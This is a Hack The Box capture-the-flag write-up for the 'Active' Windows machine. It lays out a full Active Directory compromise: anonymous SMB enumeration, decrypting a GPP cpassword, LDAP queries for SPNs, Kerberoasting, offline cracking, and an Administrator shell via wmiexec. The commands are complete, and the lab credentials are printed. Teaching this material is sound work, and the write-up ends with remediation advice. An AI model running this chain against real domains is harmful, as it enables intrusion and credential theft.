---
title: "Active — Hack The Box Writeup"
description: >-
  From anonymous SMB access to Administrator on Active: Group Policy Preferences
  password recovery, LDAP enumeration, and Kerberoasting in Active Directory.
category: "HTB Writeup"
tags:
  - hackthebox
  - active-directory
  - windows
  - smb
  - gpp
  - kerberos
  - kerberoasting
date: 2026-10-25
published: true
status: official
image: "/images/htb-active-cover.png"
---

## Summary

- **Objective:** Learn how authentication and shared folders work in Active Directory.
- **Key takeaway:** Small configuration weaknesses can combine into domain compromise.
- **Most interesting part:** Group Policy Preferences enumeration and exploitation.
- **Biggest struggle:** Identifying and exploiting Kerberoastable accounts.
- **Lab target:** `10.129.15.88`
- **Domain:** `active.htb`
- **Platform:** Hack The Box, Windows.

![[htb-active-cover.png|Hack The Box Active machine artwork]]

## Introduction

Active is an easy-to-medium-difficulty Windows machine that demonstrates two prevalent
Active Directory attack techniques: recovering a password from Group Policy Preferences
and Kerberoasting an account with a Service Principal Name.

The attack chain in this training session was:

1. Enumerate anonymous SMB access.
2. Retrieve `Groups.xml` from the `Replication` share.
3. Recover the `SVC_TGS` password from its `cpassword` value.
4. Use authenticated SMB and LDAP enumeration to identify an Administrator SPN.
5. Request a service ticket, crack it offline, and authenticate as Administrator.

**Images:** All screenshots are from the original training session. On the website,
select an image to open it at full resolution. Flag values are hidden in the public copies.
The credentials shown below belong to this Hack The Box lab.

## Reconnaissance

### 1. Discover ports and services

Run Nmap to identify open ports and the services listening on them:

```bash
nmap -sC -sV -oN nmap/active 10.129.15.88 --min-rate 10000
```

![[htb-active-01-nmap.png|Nmap results identifying the Windows domain controller and active.htb domain]]

LDAP on port `389` reveals the domain name `active.htb`. The scan identifies an
Active Directory installation and Microsoft DNS 6.1, consistent with the reported
Windows Server 2008 R2 SP1 domain controller.

### 2. Add local name resolution

Add the discovered domain to `/etc/hosts`:

```bash
echo "10.129.15.88 active.htb" | sudo tee -a /etc/hosts
```

![[htb-active-02-hosts.png|Adding the active.htb domain and lab IP address to the hosts file]]

## Anonymous SMB and Group Policy Preferences

### 3. Enumerate shares

Use NetExec to test anonymous SMB access and list shares:

```bash
nxc smb 10.129.15.88 -u '' -p '' --shares
```

![[htb-active-03-anonymous-shares.png|Anonymous SMB enumeration showing read access to Replication]]

The non-default shares include `Users` and `Replication`. At this stage, anonymous
access permits reading `Replication`, but not `Users`.

### 4. Explore the Replication share

Connect without credentials:

```bash
smbclient //10.129.15.88/Replication -N
```

![[htb-active-04-smbclient.png|Connecting anonymously to the Replication share with smbclient]]

List the directories and retrieve the policy files:

![[htb-active-05-share-listing.png|Listing the domain directory inside the Replication share]]

![[htb-active-06-policy-download.png|Retrieving Group Policy files from the Replication share]]

### 5. Inspect Groups.xml

The retrieved `Groups.xml` contains a user entry and an encrypted password:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        image="2"
        changed="2018-07-18 20:46:06"
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description=""
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                changeLogon="0" noChange="1" neverExpires="1"
                acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

![[htb-active-07-groups-xml.png|Groups.xml exposing the SVC_TGS account and its cpassword value]]

### 6. Identify the account and encrypted password

The policy identifies the domain account as `active.htb\SVC_TGS`. The `cpassword`
attribute is the encrypted password that we need to recover. Copy it exactly from
`Groups.xml`, without inserting spaces or removing characters.

### 7. Understand the GPP weakness

Group Policy Preferences (GPP), introduced in Windows Server 2008, allowed
administrators to manage users and groups across a network. One use case was
replacing a weak local administrator password on deployed machines.

The configured password was encrypted with AES-256 and stored in `Groups.xml`.
The encryption key is publicly documented, so a readable `cpassword` value does
not provide meaningful protection. This makes legacy GPP passwords a valuable
enumeration target.

### 8. Decrypt the password

Extract the `cpassword` value and pass it to `gpp-decrypt`:

```bash
gpp-decrypt -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![[htb-active-08-gpp-decrypt.png|Decrypting the GPP cpassword value to recover the service-account password]]

### 9. Record the service-account credentials

The recovered lab credentials are:

- **Account:** `active.htb\SVC_TGS`
- **Password:** `GPPstillStandingStrong2k18`

## Authenticated enumeration

### 10. Check authenticated share access

Use the recovered credentials to enumerate SMB shares again:

```bash
nxc smb 10.129.15.88 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares
```

![[htb-active-09-authenticated-shares.png|Authenticated SMB enumeration showing read access to Users]]

The account now has read access to the `Users` share.

### 11. Retrieve the user flag

Connect to the share and navigate to the user's Desktop:

```bash
smbclient //10.129.15.88/Users -U svc_tgs%GPPstillStandingStrong2k18
```

![[htb-active-10-user-flag.png|Accessing the SVC_TGS Desktop and retrieving user.txt, with the flag hidden]]

### 12. Enumerate enabled domain accounts

LDAP exposes account properties, including the `userAccountControl` bitmask.
The disabled-account flag has value `2`; the following filter excludes accounts
with that bit set:

```bash
ldapsearch -x -H 'ldap://10.129.15.88' \
  -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
  -b "dc=active,dc=htb" -s sub \
  "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \
  samaccountname | grep sAMAccountName
```

![[htb-active-11-ldap-users.png|LDAP query returning enabled accounts in the active.htb domain]]

NetExec provides an alternative:

```bash
nxc ldap 10.129.15.88 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --active-users
```

![[htb-active-12-netexec-users.png|NetExec listing the enabled Administrator and SVC_TGS accounts]]

### 13. Enumerate users with Impacket

Alongside the compromised service account, the Administrator account is enabled.
Impacket's `GetADUsers.py` provides another way to inspect domain users:

```bash
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.15.88
```

![[htb-active-13-impacket-users.png|Impacket GetADUsers output for the active.htb domain]]

### 14. Identify Service Principal Names

Kerberos uses Service Principal Names (SPNs) to associate a service instance with
an account. Add `(serviceprincipalname=*/*)` to the LDAP filter to find enabled
user accounts with SPNs:

```bash
ldapsearch -x -H 'ldap://10.129.15.88' \
  -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
  -b "dc=active,dc=htb" -s sub \
  "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" \
  serviceprincipalname | grep -B 1 servicePrincipalName
```

![[htb-active-14-ldap-spns.png|LDAP enumeration identifying a Service Principal Name on Administrator]]

## Kerberoasting and Administrator access

### 15. Request a service ticket

The `active\Administrator` account has an SPN. Use Impacket's `GetUserSPNs.py`
to request a service ticket and extract material for offline password cracking:

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.15.88 -request
```

![[htb-active-15-kerberoast.png|Requesting the Administrator service ticket with GetUserSPNs]]

### 16. Crack the ticket offline

Save the extracted ticket hash in `hash.txt`. This run used John the Ripper
with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[htb-active-16-john.png|John the Ripper cracking the Kerberos service-ticket hash]]

![[htb-active-17-cracked-password.png|The recovered Administrator password from the offline crack]]

The recovered password for `active\Administrator` is `Ticketmaster1968`.

### 17. Authenticate as Administrator

Use Impacket's `wmiexec.py` to obtain a shell and read `root.txt`:

```bash
wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.15.88
```

![[htb-active-18-administrator.png|Administrator shell reading root.txt, with the flag value hidden]]

## Recommendations

Patch the identified vulnerabilities and maintain a regular patching program.
Configuration and credential remediation are equally important:

- Restrict anonymous access to SMB shares and review who can read replicated policy files.
- Remove legacy GPP password entries and rotate any credentials they exposed.
- Review SPN assignments, particularly on privileged accounts.
- Give service accounts strong, unique credentials and only the privileges they need.
- Monitor authentication and service-ticket activity for suspicious patterns.

## Lessons learned

- Anonymous SMB access can expose valuable Active Directory information.
- Check Group Policy Preferences files for legacy `cpassword` values and other secrets.
- Low-privilege credentials can enable LDAP enumeration and reveal Kerberoastable accounts.
- Accounts with SPNs need strong, unique credentials and appropriate monitoring.
- Small configuration weaknesses can be chained into full domain compromise.

## Conclusion

The machine was compromised through anonymous SMB access, recovery of a GPP-stored
service-account password, Active Directory enumeration, and Kerberoasting of the
Administrator account.

The key defensive priorities are to restrict share access, remove exposed secrets,
rotate affected credentials, and harden service-account management.

## Credits

Adapted from my Active training report dated 25 October 2026.
The source report credits **C4rm3l0 & egre55**.
